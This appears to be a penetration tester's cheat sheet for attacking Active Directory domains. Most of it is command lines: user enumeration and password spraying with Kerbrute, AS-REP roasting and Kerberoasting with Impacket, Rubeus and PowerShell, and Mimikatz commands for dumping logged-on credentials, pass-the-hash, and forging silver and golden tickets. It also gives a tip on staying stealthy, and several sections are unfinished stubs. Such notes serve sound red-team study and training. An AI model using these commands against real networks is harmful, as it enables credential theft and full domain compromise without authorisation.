# Active Directory

This page assumes we have compromised an AD network so that we can communicate with clients and servers.

## Pre-foothold

Main goals:
- Identify services
- Identify clients and servers
- Identify usernames and attack vectors

The DC will have port TCP/88 for kerberos and TCP/389 for LDAP. Probably also TCP/53 for DNS.

### User enumeration and bruteforcing with Kerbrute

- https://github.com/ropnop/kerbrute

Used for:
- Enumerating users
- Password spraying and bruteforcing via kerberos.

*User enumeration*

Kerbrute does this via the pre-authentication, which is less likely to get logged as a failed login attempt(since it doesn't actually try to log in).

```
kerbrute userenum --domain\--dc 'local.local' -<wordlist>
```

*Bruteforcing/Password spraying*

Kerbrute has options for number of threads, safe mode avoiding account lockouts, add delay to be more stealthy and to catch as-rep hashes(see below).

### AS-REP without credentials(impacket)

If the user enumeration brings back valid usernames, we can check them for AS-REP roasting from our attack machine.

GetNPUsers.py (Impacket)

```
# Several usernames to test
./GetNPUsers.py domain/ -no-pass -dc-ip X.X.X.X -usersfile usernames.txt -format hashcat -outputfile asrep-hashes.txt

# One specific user
./GetNPUsers.py domain/USERNAME -no-pass
```

## After foothold

Main goals:
- Further enumeration of users, groups and computers in domain.
- Enumerate local admin accounts.
- Finding passwords, hashes and tickets to pivot.

When we have domain credentials, there are a ton of programs and scripts we can run to gather information on a domain computer. We can also do alot of them externally with Impacket tools.

### General

```
Checking what tickets are available to user: 'klist'.
```

### Further enumeration

**User enumeration externally**

```
./GetADUsers.py DOMAIN/USERNAME:PASSWORD -dc-ip X.X.X.X
```

**Enumeration via cmd**

```
net user [USERNAME] [/domain]
net group [/domain]
```

**Enumeration via Powershell**

Logged on users:

```
Get-NetLoggedon -ComputerName COMPUTERNAME
Get-NetSession -ComputerName COMPUTERNAME
```

There's a .NET class called 'DirectorySearcher' that makes it possible to enumerate users, groups and permissions.

```
To do.
```

### Mimikatz and Kerberos

```
# Similiar to klist
kerberos::list

# List and exports to files, useful for cracking and/or ptt.
kerberos::list /export

# Remove all tickets
kerberos::purge

# Create a fake TGS ticket(silver ticket), this can also be done with kerberoast package.
kerberos::golden /user:USERNAME /domain:DOMAIN /sid:SID /target:SECOND_HALF_SPN /service:FIRST_HALF_SPN /rc4:SPN_PW_HASH /ptt

# Create a fake TGT with krbtgt password hash, golden ticket.
kerberos::golden /user:USERNAME /domain:DOMAIN /sid:SID /krbtgt:KRBTGT_HASH /ptt

# Get locally stored password hashes from logged on users.
sekurlsa::logonpasswords

# Perform pass-the-hash with mimikatz.
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM_HASH /run:WHAT_TO_RUN

# Get a cmd up after ptt.
misc::cmd
```

### Kerberoasting with various scripts and programs

Native Windows:

```
# Finding SPNs.
setspn -T DOMAIN -Q */*

# Requesting TGS ticket from SPN with Powershell.
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPN/SPN'

# Extract from RAM with mimikatz
kerberos::list /export
```

On target programs and scripts:

```
.\Rubeus.exe kerberoast
.\Invoke-Kerberoast.ps1
```

Had issues with Invoke-Kerberoast hash format, kirbi2john works from ticket. Get latest from github.

To produce correct john format from invoke-kerberoast:
```
Invoke-Kerberoast | % { $_.Hash } | % { $_.replace('krb5tgs$', 'krb5tgs$23$*') } | % { $_ -replace "(.*):(.*)", '$1*$$$2' } | % { $_.replace(':', '~') } | Out-file -FilePath .\hashes.txt -Encoding utf8
```

Linux and off target:

```
# Impacket

./GetUserSPNs.py DOMAIN/USERNAME:PASSWORD -save -outputfile OUTPUTFILE.TXT -dc-ip X.X.X.X

./GetUserSPNs.py DOMAIN/USERNAME:PASSWORD -request-user SPECIFIC_SPN -outputfile OUTPUTFILE.TXT -dc-ip X.X.X.X
```

Creating a silver ticket with kerberoast package:

```
./kerberoast.py -r INFILE.kirbi -w OUTFILE.kirbi -u 500 -g 512 -n USERNAME

# Use -p if you have the password or -t if you have the hash.
```

## Persistence

### Golden tickets

If we ger our hands on the krbtgt password or hash on the DC, we can create a TGT with full permissions for everything. See

## Common AD attack techniques and tools

- Mimikatz
- Kerbrute
- Rubeus
- Impacket suite
- pth-toolkit

**AS-REP Roasting**

If kerberos pre-authentication is disabled  for an account, we can retrieve a ticket for the user and offline crack it. If we have valid domain credentials we can perform a search for users that dosen't have pre-auth. If not, we have to check with tools like Impacket or Rubeus.

**Kerberoasting**

Requires domain credentials. Getting a TGS of a SPN which includes the SPNs password hash, available for offline cracking.

- https://github.com/nidem/kerberoast
- https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1

**DCOM abuse**

**Pass-the-Hash**

Authenticating via hash instead of password, this only works for NTLM(usually services/servers). Doable via all of Impackets tools.

**overPass-the-Hash**

Authenticating via hash first, then requesting a ticket to gain access via kerberos.

**Pass-the-Ticket**

**Silver ticket**

**Golden ticket**

**DCSync**

## Other

### SID/RID

Security Identifier, Relative Identifier

S - R - I - S

S = SID
R = Revision level, usually 1
I = Identifier-Authority, often 5 within AD
S = Subauthority values, containing:
- The domains numeric identifier(XX-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX)
- Relative identifer(-XXXX), represents specific object in domain.
